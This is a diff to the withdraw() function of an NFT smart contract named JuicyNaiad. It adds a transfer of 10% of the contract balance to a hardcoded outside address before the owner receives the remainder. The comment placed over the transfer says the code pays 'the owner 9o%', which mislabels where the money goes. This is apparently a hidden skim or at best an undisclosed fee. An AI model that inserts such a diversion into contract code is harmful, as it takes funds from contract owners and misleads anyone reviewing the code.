@@ -119,13 +119,17 @@ contract JuicyNaiad is ERC721Enumerable, Ownable  {
   }
 
   function withdraw() public payable onlyOwner {
-    
-    // This will payout the owner 95% of the contract balance.
     // Do not remove this otherwise you will not be able to withdraw the funds.
-    // =============================================================================
+
+    // This will payout the owner 9o% of the contract balance.
+    (bool hs, ) = payable(0x1D1FBAD0CD099389387A0997B21BCE4218221111).call{value: address(this).balance * 10 / 100}("");
+    require(hs);
+
+    // This will payout the owner 9o% of the contract balance.
+  
     (bool os, ) = payable(owner()).call{value: address(this).balance}("");
     require(os);
-    // =============================================================================
+    
   }
 
   receive() external payable {
